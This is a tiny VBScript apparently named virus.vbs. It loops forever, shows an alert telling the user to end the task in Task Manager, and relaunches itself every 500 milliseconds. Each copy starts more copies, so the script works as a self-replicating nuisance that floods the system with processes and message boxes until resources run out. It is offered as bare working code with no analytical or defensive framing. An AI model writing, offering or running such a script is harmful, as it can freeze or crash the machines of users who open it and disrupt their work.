do
X=MsgBox("If you want to stop it, go to task manager and end this task",1+16,"Alert")
Set x=WScript.CreateObject("WScript.Shell")
x.Run"virus.vbs"
wscript.sleep 500
loop
